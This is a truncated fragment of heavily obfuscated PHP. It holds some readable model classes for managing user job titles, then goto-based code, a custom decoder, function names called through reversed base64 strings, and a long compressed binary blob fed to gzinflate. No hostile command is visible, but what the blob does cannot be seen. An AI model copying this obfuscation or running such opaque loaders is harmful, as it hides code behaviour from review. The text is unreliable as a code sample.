=> 0); $Ïê§ü„õ = $this->field($¿ó™®¤[32])->where($’…÷ªâ)->select(); $Ïê§ü„õ = array_to_keyvalue($Ïê§ü„õ, $¿ó™®¤[12], $¿ó™®¤[32]); if (!$Ïê§ü„õ || !in_array($¦®Å„ÉÃ, $Ïê§ü„õ)) { return $¦®Å„ÉÃ; } for ($ÄÎ¾²– = 0; $ÄÎ¾²– < count($Ïê§ü„õ); $ÄÎ¾²–++) { if (!in_array($¦®Å„ÉÃ . "\x28{$ÄÎ¾²–}\x29", $Ïê§ü„õ)) { return $¦®Å„ÉÃ . "\50{$ÄÎ¾²–}\x29"; } } return $¦®Å„ÉÃ . "\x28{$ÄÎ¾²–}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\152\157\142\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\x64\x65\163\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\x65\154\x66\x4a\157\142\x4c\151\163\164"; public function listData($òãäçá‘ = false, $›êÄ­µç = "\x73\157\162\x74", $‰×³¨¾˜ = false) { return parent::listData($òãäçá‘, $›êÄ­µç, $‰×³¨¾˜); } public function remove($Ç½ä¦óË) { return parent::remove($Ç½ä¦óË); } public function add($•ÈàøÓË) { $İ‰‹„ÌË =& $_SERVER[¡“ËÌ§œ]; if ($this->findByName($•ÈàøÓË[$İ‰‹„ÌË[32]])) { return !1; } $•ÈàøÓË[$İ‰‹„ÌË[1875]] = $this->getSort(); return parent::insert($•ÈàøÓË); } private function getSort() { $œºÅŞœÓ =& $_SERVER[¡“ËÌ§œ]; $áƒ‚¢Ğ = parent::listData(); $ˆŸòÈĞŞ = array_to_keyvalue($áƒ‚¢Ğ, $œºÅŞœÓ[12], $œºÅŞœÓ[1875]); return empty($ˆŸòÈĞŞ) ? 0 : max($ˆŸòÈĞŞ) + 1; } public function update($ı®°—ŠŠ, $ğÁöÓÚ¾) { $„å½ÉâÈ =& $_SERVER[¡“ËÌ§œ]; $ëÜ®…¼Œ = parent::listData($ı®°—ŠŠ); $çÕ¦ôˆ = $this->findByName($ğÁöÓÚ¾[$„å½ÉâÈ[32]]); if (!$ëÜ®…¼Œ || $çÕ¦ôˆ && $çÕ¦ôˆ[$„å½ÉâÈ[437]] != $ëÜ®…¼Œ[$„å½ÉâÈ[437]]) { return !1; } return parent::update($ı®°—ŠŠ, $ğÁöÓÚ¾); } public function setUserJob($ü°»éÖä, $¼â¹£¸¢) { $ïˆí–àÇ =& $_SERVER[¡“ËÌ§œ]; if (!is_array($¼â¹£¸¢)) { $¼â¹£¸¢ = array($¼â¹£¸¢); } $ÑÌ”á—¸ = parent::listData(); $¾»í² = array_to_keyvalue($ÑÌ”á—¸, $ïˆí–àÇ[32]); $¦Ïïåå = $ïˆí–àÇ[407]; foreach ($¼â¹£¸¢ as $ç»ùÃıú) { if ($¾»í²[$ç»ùÃıú]) { $¦Ïïåå .= $¾»í²[$ç»ùÃıú][$ïˆí–àÇ[437]] . $ïˆí–àÇ[50]; } else { $ßİÙÚ¬ñ = $this->add($ç»ùÃıú); $¦Ïïåå .= $ßİÙÚ¬ñ . $ïˆí–àÇ[50]; } } $¦Ïïåå = rtrim($¦Ïïåå, $ïˆí–àÇ[50]); Model($ïˆí–àÇ[563])->metaSet($ü°»éÖä, self::JOB_KEY, $¦Ïïåå); } public function getUserJob($¸Ë°¢Î™) { $„²ç•Ü = Model($_SERVER[¡“ËÌ§œ][563])->metaGet($¸Ë°¢Î™); return $this->getUserJobInfo($„²ç•Ü[self::JOB_KEY]); } public function getUserJobInfo($›ƒá¼…) { $³««ÄŒ– =& $_SERVER[¡“ËÌ§œ]; $…Ø’ˆ¨Á = explode($³««ÄŒ–[50], $›ƒá¼…); $˜Èåş‡š = parent::listData(); $˜Èåş‡š = array_remove_key($˜Èåş‡š, $³««ÄŒ–[201]); $»’—Ö§‡ = array(); foreach ($…Ø’ˆ¨Á as $ù§îßµ–) { if (isset($˜Èåş‡š[$ù§îßµ–])) { $»’—Ö§‡[] = $˜Èåş‡š[$ù§îßµ–]; } } return $»’—Ö§‡; } } goto c¬ª‚èÔÍ§; E™¼²¨ÄÇ: $fileSize = strrev(base64_decode($_SERVER[ÛÛ¹¦ó][0])); function binCheckNeq($ØõòÇ‚, $¿ï¶„) { return $ØõòÇ‚ != $¿ï¶„; } $_SERVER[$_SERVER[ÛÛ¹¦ó][1]] = $fileSize($_SERVER[$_SERVER[ÛÛ¹¦ó][2]]); goto F·­İéá£; B†­ĞÌÅ„: define($_SERVER[¡“ËÌ§œ][270], 1); define($_SERVER[¡“ËÌ§œ][271], 0); define($_SERVER[¡“ËÌ§œ][272], 2); goto DŒÏ‚Â¯; có´‘”ÄŞ½: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('oZPLzKec'), base64_decode('m7v1zpGz')); $_SERVER[¡“ËÌ§œ] = explode("\x7c\x2\x7c\x4\x7c\x3", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xd5\x28\x3b\x4\x4a\xa1\x85\x52\x4a\xb\xc\x26\xc1\x76\xa2\xc5\x76\x56\x9c\x38\x89\x6c\xcb\xb1\x12\x59\x72\x24\x39\xb\xb6\x99"."\214\245\221\65\261\244\121\64\43\157\111\32\226\244\254\111\12\145\137\313\126\2\45\11\133\130\23\112\123\240\55\224\345\321\237\275\224\226\46\41\374\100\331\51\224\226\276\273"."\234\273\314\110\206\377\175\357\175\337\343\43\326\275\347\56\163\227\163\317\75\367\334\163\316\175\355\265\237\76\370\213\217\127\355\267\352\200\125\373\137\366\317\147\176\171\337\136"."\32\136\265\57\372\173\20\15\237\170\301\41\373\220\377\216\272\340\374\232\232\366\151\207\116\212\174\153\343\275\233\265\73\264\333\264\13\242\341\247\376\20\72\374\231\73\346\7".base64_decode('99z01MieffdZt/17zzaizLRsI/1R8qat6MOGZVsUkDTzaaOfho08/fXTn65YuKjn')."\x4c\x5b\xa7\x51\x1f\xfd\x51\xa1\x5d\xe4\xaf\xb5\x22\x6b\xb0\x74\x35\x12\x4d\xa8\xf1\xae\xce\xce\x60\x2c\x1\x99\x1a\xe5\xf4\x9c\x99\x82\x50\x41\x2b\x6a\x39\xf8\x7e\x41\x2f\x5a\xa8\x35\x72\x75"."\152\301\54\350\171\7\104\0\122\232\255\365\151\26\324\324\332\254\266\6\73\303\321\245\152\142\151\147\20\162\364\251\53\112\172\161\204\306\110\60\156\153\105\73\141\344\164\236"."\143\250\310\333\325\34\234\27\212\50\211\130\40\22\17\264\44\102\321\10\5\267\104\73\72\102\211\162\170\54\32\16\67\7\132\26\224\247\164\306\2\363\72\2\12\152\137\126".base64_decode('V4182qxRltGUZUotDbQZejZFg3mNNcceKUAowUNomvKlbJZGIjyU0tNaKQuj1SpH')."\12\105\43\247\261\116\57\320\107\70\224\6\264\222\155\32\371\44\215\4\207\355\242\46\340\250\255\111\64\321\172\36\252\212\7\303\301\226\204\202\33\250\264\305\242\35\12\114".strrev('©y¥1ƒZÆ‹*2ĞÕ`W=l¬eaÂ¡CAøµké5Stn'."\n".'‚Æn,¨½l³NB').strrev('mgJ–#§à2dµantòÖÚ$A¤ğ‡ôà4bÆ'."\r".'MKi3Aj‡Şfræi(F"')."\x75\x50\xcb\x96\x18\x9a\xe\xd0\xdf\x6a\xf8\x81\x5f\xd3\x2\xd4\x5d\x61\xe4\x8d\x12\xa0\x29\x54\x61\x9a\x7c\x59\x41\xa0\xc4\x72\xeb\xc\xa2\xa7\x20\x90\x43\xe5\x4d\x58\x79\x68\x19\xe\xd2\x60"."\323\154\372\73\23\62\365\251\70\115\57\332\252\236\117\232\51\43\17\213\165\16\40\235\146\147\132\213\6\312\100\343\151\63\233\142\141\313\30\205\256\244\215\254\36\51\345\344"."\x2c\x3c\x9a\xcc\x18\xd9\x54\x91\xad\xaf\xaf\xcb\x49\xa3\x61\xbe\x5c\x71\x5e\x11\x2b\xa0\x96\xf0\x95\x6e\xa4\x47\xc4\x7a\xc3\xf9\x3a\x79\xaa\x65\x96\x8a\x49\x3d\x84\xd6\x7\x8d\xd7\x3\x58\xb7"."\155\324\71\30\33\303\354\52\144\115\55\25\327\213\274\153\206\331\206\52\212\226\154\31\130\42\331\332\314\142\256\25\121\6\370\76\132\25\106\127\205\204\1\266\56\122\322\210".base64_decode('+Wu6z/R+1ds9F/2pBdLXA23K6Nmsqg/rsHByqakWGwy/1Wfk/QhCo6GomtGsTEdq')."\xaa\x4a\x4a\x31\x8a\x9a\xd2\x87\x7d\x85\x4c\x1\x56\x35\x5f\xc8\x3d\xe\xc4\xc6\x43\x17\x31\xed\xa0\x44\x97\xb3\x66\x52\xcb\xca\x5d\xa4\xe1\x8c\x6d\x17\xe2\x7a\x3e\x85\x47\x2\xba\x62\xe\xe5"."\311\110\25\164\35\62\265\172\224\224\322\241\54\125\332\33\215\106\213\25\314\145\171\210\365\216\303\54\16\264\207\331\164\246\322\64\320\307\266\205\52\370\240\141\21\12\47\226".base64_decode('p1YoZI2kZhtm3m8mbd32WnZR16DGQDKpW5a3xczbRTPrDWSz5pA3WjT6jXyjMhGI').base64_decode('LUpEi9qLCWAjrNSqmQpGHPyZiU0lO+2dwVYgz13U8lZaL3qDsDIaFdRYTgVZtlbD')."\x2a\x98\x96\x81\x9b\xd7\xa8\x68\xb6\xad\x25\x33\x98\x82\x88\xea\x9b\xbe\x26\xbf\x91\xcf\x1a\x79\xbd\x2c\x6f\x70\xb8\x60\x14\x75\x8b\xb5\x55\x99\xd7\x91\x80\x4a\x50\xed\xba\xb7\xb3\xa8\xf5\xe7"."\264\106\245\120\352\103\43\3\53\265\2\214\346\206\241\151\124\222\70\352\121\162\45\313\366\26\165\104\212\14\264\335\301\40\207\322\336\16\274\256\14\75\345\215\43\212\15\340"."\311\165\123\24\204\72\12\113\243\320\366\104\242\123\15\265\241\55\71\22\124\73\2\211\226\166\150\266\255\365\263\66\207\21\35\346\125\62\340\22\57\132\137\30\271\42\250\257".strrev('aĞ9ß°kA@u±éñã÷ËLoltñ™a¡Ç3„–>Ã™õLÀeF‘æáôEéiØ')."\x3d\xdf\x6f\x67\x58\xc1\x78\x30\xb6\x28\x18\x53\xe3\xd1\xb6\xc4\xe2\x40\xc\x36\xf3\x3c\xc2\x92\x61\xf6\x29\x5c\x75\xd6\x1b\xd3\x53\x68\xe8\x93\x36\x2b\xa7\x15\xf0\xa8\xb1\x3c\x78\x71\xe0\xb9".base64_decode('Yql4wbC0cGgeHphWr4UyeeVcrO6wkTNw222eQkYS7fTzoEF+0qGmHmtiTU9qUq0X')."\xfd\x9d\x58\xdb\xdd\xd3\xea\x9b\xd8\x3b\xc7\x6f\x88\x32\xfe\x7a\x5f\xbd\xd2\x50\x37\x4d\xe9\x44\xac\x87\xa1\x65\x15\xe8\x74\x59\x8e\x3a\x25\xba\xc0\x39\x2c\x2\x9b\xf3\x66\x5e\xff\x9a\xc1\xc1"."\173\227\264\354\135\303\112\201\261\340\302\256\140\74\241\166\4\23\355\321\126\370\172\60\0\241\260\111\227\55\353\155\67\375\351\205\331\355\245\77\252\141\265\111\333\12\216\162"."\362\243\232\175\313\321\144\164\350\214\306\246\51\215\16\345\264\176\211\310\143\50\216\165\230\105\335\11\21\133\325\142\43\305\367\10\24\155\327\215\376\14\214\227\201\153\113\232".base64_decode('WbOoZTFlZItCZ9Sq3wBqBURYROJGrsAaa2dKuT4pCNTe5juVhTCJhTMm39nMIoQa')."\xfd\x50\x64\x42\x43\x1b\xa3\xfb\xfe\xf8\x64\xf4\xbf\x20\xf2\x29\x33\xa7\x31\x92\x49\x88\x9d\x9e\xa2\xd4\x8e\x82\x26\x3a\x52\xda\x75\x4d\x6c\xd7\x76\xd1\x36\x31\xb4\xe8\xc8\x82\x86\x36\x63\xc2"."\24\367\353\254\111\45\336\66\326\312\224\236\325\331\270\144\164\266\141\324\101\66\264\341\361\121\113\363\331\103\174\37\202\212\235\332\260\142\250\44\46\357\54\276\30\63\312\2"."\220\105\73\124\224\314\270\210\167\26\365\264\1\213\64\217\146\244\103\53\16\260\76\240\31\20\270\202\43\22\36\265\165\205\303\152\113\64\222\100\54\65\205\54\216\205\22\101"."\206\267\201\126\65\320\322\311\67\136\61\243\220\1\23\230\362\335\203\102\6\33\140\146\121\163\374\142\233\103\24\273\140\346\55\335\233\204\22\202\365\56\113\112\211\135\0\350".base64_decode('jNg5XJvBsFfLjXpzaAl4eUOde7CSkLfyEMyNIO54GNGpiG3+ndE4FJiDoYgB69OL')."\360\261\316\56\110\312\111\170\61\57\10\300\103\331\176\256\1\133\25\130\34\147\204\271\204\362\27\215\121\115\164\151\16\153\17\353\110\56\53\370\71\147\257\274\142\344\121\225"."\x53\xbc\xed\x1d\x81\x16\x6f\xbc\x3d\xd0\x30\x75\x1a\x85\x2e\xcd\xa5\x7a\x12\xed\x86\xd5\x73\x1a\x8f\xc3\xb8\xd\x59\x53\xd4\xa2\x8e\xe\x62\xac\xe6\x86\xba\x7a\xb6\x7c\xd1\x2e\x2a\xb5\x67\xa9"."\67\347\305\265\340\41\363\325\325\325\261\272\46\115\123\62\210\153\4\234\65\363\51\62\55\60\130\175\245\344\0\133\26\132\222\61\64\370\304\147\171\207\14\106\121\306\163\336"."\x6f\x7c\x39\xba\x8c\x77\x92\x4e\xa8\xa2\x44\x18\x17\x55\x4b\xe2\x8f\xa9\xa8\x46\xbb\x64\xc9\x43\x83\x16\x4f\xa\x15\x32\x18\x9f\x46\xa1\x5a\xb6\x1f\x8d\xb2\x9d\xc9\xc9\x40\x31\xd3\x34\xae\x53"."\366\201\117\26\37\105\74\266\225\250\71\133\354\210\163\30\141\133\126\245\66\54\251\324\206\45\256\66\54\51\157\3\5\131\106\177\36\365\222\221\350\104\173\50\262\100\355\210"."\266\6\303\152\50\202\266\240\104\71\274\253\263\65\300\326\254\14\157\216\46\332\35\320\56\264\11\55\12\204\103\356\354\301\45\241\170\42\136\61\11\301\272\202\256\24\164\342"."\xef\x8c\x5\xdb\x42\x4b\x78\xb4\x2d\x14\xc\xb7\xc6\xd5\x96\x40\x4b\xbb\xc8\x13\x9\x74\x40\x44\x4d\xe3\x33\xb7\xe5\x77\xe6\x57\xd1\x6e\x1a\xe7\x27\x77\x75\x10\x4b\x21\x18\x16\xaa\x8e\xc3\xb2"."\xca\x8e\x81\xaa\x20\x16\x88\x6b\xd2\x61\xc0\xa1\xbb\x58\xf6\x41\x7a\xa2\x32\x24\x2d\xb1\xbd\x9e\x9f\x18\x72\x6c\xb\xc8\x69\x40\x2d\x35\xc6\x11\xd5\xd0\x9f\x5a\x25\x10\x57\xec\x82\xca\x89\x7d"."\xdf\x8\xf\x92\x6e\xb0\x38\x3a\x1b\xc0\xf7\x15\xd8\xd9\xcb\x5a\xa0\xe2\x3c\xcd\x7a\x9a\x6f\xb8\x95\x1\x81\xb4\xcd\xf7\x75\x57\x1c\x51\x39\x91\x86\x66\x20\x40\x84\x2c\x8\x13\xc8\x8c\xc0\x67".strrev('ËÆ°,A¿bØ’h¸Ã_Ã 5CƒÌ8ºˆñ`3´j-\'5€v‹3D')."\142\320\227\233\154\50\127\321\237\123\200\24\240\363\26\120\226\74\33\365\76\274\365\62\66\202\5\322\210\354\261\155\323\54\361\257\365\231\146\226\21\144\304\10\362\235\201\113"."\x59\x96\x5b\xc\x49\x86\xd9\x9e\x32\x89\x93\x32\x40\xdd\xe8\x82\x60\x44\x65\x98\x45\x63\x12\x36\x52\x40\x30\x16\x8b\xc6\x60\x40\x6c\x73\x80\x1d\xbe\x69\x62\x2c\x18\x67\xe4\x1c\x93\x4d\x83\xd".base64_decode('l983CbBYRxwGfN5/es/QpJpu7yRfLwrUTpxLoxDr8Tmi46F8qchLY/64xppT29jj')."\xef\xf1\xd7\xcc\x69\xec\xe\x78\x47\x35\xef\x68\x9d\xf7\x54\x6f\xef\xa4\x1e\x5f\xed\x24\x0\xf4\xae\x6c\xf0\x4c\x59\x8d\x33\xa0\x8c\x73\x4e\xee\x45\x3f\x4d\x3d\x73\x26\xf4\x78\x4f\xf9\xf1\xb2"."\271\335\75\275\325\215\223\116\352\361\235\334\63\324\73\261\166\16\373\116\262\124\54\352\171\106\261\120\123\123\223\152\120\223\20\337\314\263\344\311\336\46\145\140\11\243\106\101".base64_decode('QFdOW83gaA71flGi29szqXeOVE4Cub+FKCnaaDM8X8B7Gu4ZL4rXPeBHKZ8U2xJe')."\27\175\132\22\350\0\242\221\174\11\41\226\215\13\144\234\307\265\225\23\350\357\152\66\221\375\372\60\337\277\322\106\21\260\263\224\67\126\60\171\123\136\137\1\1\323\146\370"."\xdd\xa7\xdb\x43\x3a\x43\xf\x4\x77\xc4\x11\x72\x30\xba\x8f\x92\xa4\x58\x56\xda\x33\xc8\xc9\x59\xda\x6e\x19\x67\x57\x50\x31\x2b\x3d\xc4\x63\x68\x1b\x81\x79\x1a\x7\xb9\xad\xa4\x56\xd0\xe3\x52"."\xf\x55\x35\x11\x68\xe\x7\x55\x46\x61\x80\x12\xb3\x38\xa1\x8a\xcd\x5c\x36\x8b\xba\x26\x28\x2a\xa3\xf\x49\x71\x56\x23\xc7\x52\x58\xf9\xd6\x8a\xac\x42\x8\x83\xa2\x17\x8b\x66\xb1\x91\x88\xa9"."\255\122\1\163\336\350\10\156\243\261\125\320\6\256\64\315\126\350\220\103\71\125\236\200\202\306\30\102\54\126\321\305\242\307\24\12\332\124\20\63\144\41\176\231\261\261\376\232".base64_decode('np5St57q7UaIr3nTvSsnr65lxzl/D/qPRQIVBKYqp4YqYsR8uB1cZuaI8GQaNYuc')."\27\56\70\116\113\266\151\153\131\107\25\11\14\141\244\211\361\121\40\75\242\263\35\26\24\13\363\154\222\244\231\220\323\10\227\326\160\106\110\22\165\342\22\161\335\366\361\34"."\36\51\121\105\161\207\324\277\251\212\21\373\74\132\116\55\322\126\107\145\170\361\21\313\326\163\16\361\264\245\153\305\144\246\255\224\315\332\374\314\226\65\6\340\13\260\126\100"."\x5a\xee\x85\xdd\x60\x52\xa5\xa2\x6d\x66\x91\x89\x3e\x26\x42\x33\xaa\x26\x56\xca\x18\xca\xe7\xcd\x54\x9f\x8c\x6a\x62\x93\x9d\x17\x40\xec\x4c\x42\xa9\x61\x92\x5d\x25\x14\x51\x9a\xa3\xd1\x70\x30".strrev('¨µ9¬-€šp«i´UÔë|!»ÊèA§:Æ%°ÄÚ'."\0".'ÎÁâbû~ğQ').strrev('@›œ,%üNÁ%¡õª€äœ-†w.>—ÄU,~}PcpÜ~X'."\r".'Jß‚…iÆ')."\303\241\126\57\353\370\22\157\10\316\372\74\140\100\151\263\100\31\133\324\114\164\246\36\140\310\206\50\266\315\262\202\254\26\142\370\310\343\301\262\112\17\146\205\74\150\220\75"."\xf8\xa0\xee\x11\xa7\x48\x8f\x10\xfd\x7a\x6\xd\x7d\x88\x4\xf8\xb1\xcf\x3\xa7\x41\xf\x62\xce\xd1\xe0\x60\xfe\x1b\x82\xa1\x56\x8f\x61\xb5\x92\x3\x2c\xf9\x0\x49\x62\xd\xb2\x33\x58\x22\x97".strrev('¯(sÑ„#ÍËÇ|`ñŸ""	h~­«4+BÑğ¥&Å¬<ÓXzÏP}aq´<FÕ')."\111\26\30\46\161\366\365\210\163\261\247\277\150\226\12\235\354\233\122\214\66\13\0\242\315\34\20\63\115\333\303\244\36\36\131\40\2\255\10\260\145\135\161\70\53\367\206\214"."\xbf\xbb\x11\x30\x77\x38\xa9\x7c\x94\xbe\x61\xb2\xca\xe7\xc3\x29\xfc\x59\x49\x6b\x4\xe9\xd2\x6a\xb6\x29\x3b\xf2\x88\xe9\x15\xab\x41\xc4\xf0\x4\x88\xd0\x22\x41\x67\x70\x87\xda\xb4\x41\x19\xf3".base64_decode('KmEhWxYMjYUcWtxACFbdLeFw303gjya0/rj0OVvrZ9/CtBaljpmVhmN6ciQpRCat').strrev('hóĞ’ô.×›è+ö|'."\n".'[87Â|õ'."\0".'ÆT…iVUô]¥®/ª®.sÆ ’')."\101\160\104\264\261\170\117\211\43\162\324\226\145\103\324\40\47\303\156\342\161\306\360\322\363\221\335\205\134\360\305\271\154\55\34\154\113\50\363\243\210\24\33\246\112\313\250\70".strrev('ÒF-ÃÄ4r•E‡„lãHr©bªk-m´2ÈQO–¸‹¤‰¥.7QÅy˜şB³').base64_decode('fbHVMlBU7OwlYGM1Cw6U+MIGQjqDiamVsVQiRgLA2uX4Lo6KFcZQQsEf8EiMFyY4').base64_decode('XrFWpKhzyF0Y6eIH8BB1GvkRIy/LVgVUsBSCo8FL3SUNbh0rTLcYIbv1gEzXgzc7')."\x89\xdb\x10\x82\x45\xd4\x7a\xb2\xe3\xe6\x1c\x52\xe8\xf2\x96\x33\xa2\xeb\x75\x2c\x68\x40\xf2\x8c\x56\x14\xe3\xc7\xc8\x10\xa6\x5\x42\x48\x8d\xb3\x88\xa8\x94\x2d\xad\xd\xa\x6\xcb\x51\x46\x22".base64_decode('JpY9whosB52V0mirh/y2o47LK5TPCCYdLBOlQWj5h9HwoB/SkYTpwVJt9EN3eXat')."\x4a\x32\x31\x54\x2f\xe5\x5a\xe1\xf2\x10\x87\x17\xa1\x35\xf\xb8\x82\xc7\xb8\x86\xd1\xc\x60\x86\x54\x49\xa4\xc1\x69\x8e\x93\xa0\xd1\x96\x4\x38\x7d\x47\xbb\x26\xda\xf3\x68\x18\x9d\x3d\xb2\x68"."\253\53\372\360\22\231\207\67\54\171\257\160\362\33\161\35\365\31\312\211\332\342\145\151\162\156\41\267\304\264\137\354\25\154\134\305\12\23\143\55\226\123\277\150\20\36\132\265"."\274\35\30\201\53\307\333\212\46\147\324\371\266\357\316\324\102\116\302\374\246\334\265\125\113\343\341\140\57\312\100\122\31\67\243\341\202\272\242\142\42\34\373\14\5\261\113\15"."\55\225\63\362\276\42\335\315\174\350\174\3\332\15\236\72\211\27\23\144\146\245\105\366\5\330\375\126\273\346\331\66\115\164\150\56\372\212\350\313\242\101\22\211\3\372\100\56".strrev('@¦¤Œé*(Í£ÕJÄ$e*«œ3üJ‰4hÆ‚ñ’±(ÉÚÄH%¼s(6ñ¿')."\342\141\316\30\143\332\21\114\31\66\206\340\305\150\262\33\30\221\121\354\230\2\46\223\154\262\363\224\115\276\70\6\171\46\70\162\72\171\7\0\116\44\133\272\117\260\72\225"."\x15\x3e\x92\x66\x1\x30\x42\xd2\x74\xca\x99\x83\xba\x4\xf4\x59\xb6\x59\x10\x29\x52\x94\x26\x4b\x49\xa2\x52\x29\x17\x9f\x24\xd2\x22\xb4\xbe\x52\x84\x61\x16\x43\x46\xf2\x42\x59\x22\x1c\xa0\x4b"."\330\207\117\33\76\231\116\7\212\105\206\300\264\233\370\72\21\1\145\20\246\205\161\266\372\52\155\127\264\362\340\240\320\143\242\125\341\17\373\350\362\367\151\251\124\224\135\251"."\xca\xe1\xf2\xac\xb2\xa0\xb4\x72\x45\x44\xa9\x8c\x57\x25\xc5\x2a\x67\xf\x64\xb3\x42\x11\xc5\x1d\x1f\xb3\x8\x5d\xf6\x72\x21\x19\x32\x66\xb1\x36\x72\x32\x67\xc7\xc4\x4a\x30\x7e\xc8\x91\x97\x9d"."\223\121\167\263\361\116\122\75\66\313\62\6\221\23\323\130\71\216\166\371\226\214\221\327\55\276\131\27\255\112\64\353\377\63\157\134\76\362\170\205\214\205\56\70\115\22\251\143".base64_decode('fcpBXT5BcLmxIFl8Cy9jTIA5kCKq7WCpYqR+aTk5MAQtXzoeeMsKRX3WGDjrzqcz')."\251\72\241\201\303\174\247\225\13\341\44\74\227\143\125\312\323\171\145\202\175\223\363\41\134\305\11\143\125\303\222\171\55\257\377\364\366\63\156\375\204\206\37\177\354\251\113\66"."\275\107\303\223\101\43\17\375\305\377\110\130\350\317\256\133\274\322\374\341\157\277\163\360\363\376\67\37\273\357\347\233\116\12\236\377\137\147\167\164\135\361\146\313\215\255\347\155".base64_decode('vGl8d95e8uf3Lqr+++sn/OOz1tiHc9pee+yLk4PnPzS3997M+mMyZ04bPOOYcRf/').base64_decode('/I1fjO7qtt//bMXQxZcesnZwKD1opj+bvvHp2SPv/H7jddunzn3giM7vb9h/7x+z')."\x27\x9e\x76\xc5\xdc\x67\xae\xbc\x6a\xff\xbb\x63\x13\xbf\xf7\xd1\x84\x49\xcf\xd6\x3e\xfa\xf1\x43\x67\x3e\xf5\xd6\x9\x87\x1e\x34\xb8\x7c\xcb\x92\x7f\xad\x99\x79\xd2\x9d\xeb\x3e\x3c\xf7\xd9\x9a".strrev('ì+‘¼uït¾ï;÷KvßöóáÎÅxĞWC»ÎvU}Æu)¹ÜôOªóı¿Ş»')."\xbc\xf1\xbd\xab\xa\x57\x7d\xfa\x93\x3f\xdf\xa8\xcc\x7a\x46\x9f\xaf\x58\x8b\x9e\xf9\xd1\xbf\x57\x2d\xfc\xcf\xb2\xc0\xc5\x5f\xdc\xf9\xda\xed\x1f\x9d\xf7\xe2\xdf\x92\xf\x7e\x37\x7a\xdc\xe6\xa6".base64_decode('2W9k75v2ZEdT6NBV7XffOu2a1F3zcu/+s/aXhTX7/HX+iVuOeekPa2ft/MP005Yd')."\xfb\xdc\x3f\x4e\x7d\xe5\xb8\xeb\xbf\xf8\xf7\xbf\x9e\x8c\xe5\xf\xdf\x73\xf1\xe9\x4f\x7f\x74\x83\xf1\xe5\xbd\xf9\x93\xf5\x2d\xef\x85\xdb\xda\xb4\x5b\x2e\x99\xb4\xef\xa3\xb5\x2f\x4c\xdb\x6f\x72"."\373\3\257\335\363\334\261\157\346\126\174\162\354\77\336\376\357\127\347\347\177\77\361\270\235\117\134\31\275\341\217\347\177\262\373\350\71\67\276\273\357\301\247\274\324\265\367\202"."\343\175\153\323\372\41\353\27\36\170\165\363\143\37\234\367\302\51\357\316\376\326\304\243\17\172\144\316\257\37\173\367\240\366\163\147\74\167\370\332\221\151\37\32\55\253\262\373"."\x1d\xf9\xd1\xa3\xfb\x4c\xbb\xab\xf9\xdc\xf1\x77\xf9\x37\xd4\x7c\x76\xf1\xcb\xd9\x63\x6f\xd3\x83\xa3\x17\xfa\xef\xdf\x74\xf6\xe7\x57\x3d\xba\xaf\xf5\xdd\xeb\x5b\xe\x7e\x79\xd3\xf4\x8f\xd7\x9e"."\360\250\235\275\177\372\332\347\37\332\267\145\303\113\217\137\361\304\101\361\375\264\247\316\176\376\370\226\271\313\216\170\177\147\103\363\360\363\311\355\217\75\161\302\261\255\51\143"."\352\361\371\127\176\121\173\377\103\205\273\237\335\362\300\206\213\152\375\13\176\372\344\165\337\377\315\114\355\341\161\65\167\44\337\334\347\206\355\347\125\373\166\76\72\353\356\35"."\207\336\175\303\312\237\375\351\336\343\273\143\343\216\115\34\370\326\51\353\176\377\347\361\247\14\176\74\360\367\346\144\372\347\67\177\21\52\36\30\230\173\163\367\7\153\157\70"."\x72\x5a\x6e\xe8\x92\x5f\xbc\x7b\xd5\x53\xe3\x9e\x5d\xf7\xaf\xb5\x17\x1c\xdd\x71\xdb\x4d\x35\xb9\x33\xaf\x6c\x7f\x68\xcf\xb0\xfd\xd9\x2f\x92\xd3\x7e\xb3\x6b\xfc\xb7\xfe\xba\x8f\xf6\xc8\x1d\xaf"."\316\336\173\323\321\247\377\346\235\13\315\153\377\170\305\115\37\176\372\351\226\235\267\154\334\277\157\356\341\307\35\360\374\325\107\37\376\374\7\157\346\33\256\72\324\370\327\163"."\x1f\x9d\x11\x78\x6c\xe1\xe2\xd2\xfa\x63\x17\xcc\xfb\x7c\xdc\xe5\x97\xde\xb0\xfe\xf\x3\xcb\x56\x1d\xd5\xfb\xf1\x19\xfb\x1e\xf5\xfd\xc1\xf5\x2f\xaf\xbd\xf5\xc8\xc7\x67\xfc\xd7\x19\x7\x9e\x9c"."\176\172\175\157\162\331\113\167\37\334\134\337\176\333\173\337\236\362\235\327\217\71\244\163\276\176\321\275\303\125\13\162\37\352\343\356\74\171\327\147\37\264\237\65\341\224\7\317".strrev('.Gùş¾\\,§µÙå¼Uh\'íì:î#Íç|>®wQÒŠù;íÏÅËm»o¯ñæ?')."\xce\x9e\x7b\xc7\x23\xb\x5f\x3c\xee\x7b\x3b\x7a\xff\x9e\x9b\xf0\xf4\xa5\x7b\xff\x76\x6f\xbc\x7d\x55\x7a\xe8\xe9\xa6\x8e\xcd\xc9\xb9\x97\xc6\x3f\xf1\xfe\xe5\x8\xf3\xc8\xbe\x7\xea\xb6\x7d\x91"."\xda\xb4\xeb\xc\xe3\xf6\x1f\x29\x9f\xed\xfd\x7d\xe3\x93\x9f\x5d\xf7\xea\x41\xef\xbe\x32\xf1\x30\xeb\xac\xc8\xf\x82\xb7\xee\xf7\xc4\x7d\x27\x9e\x15\xcc\x24\x5e\xcf\xbd\xfb\xf6\xee\xf4\x3d\xa5"."\115\323\117\273\146\160\311\153\317\75\274\171\321\373\243\43\315\217\36\377\247\330\335\255\33\276\175\363\223\137\54\361\235\271\243\360\373\167\217\332\275\370\7\307\135\134\132\74".strrev('KÃğ/	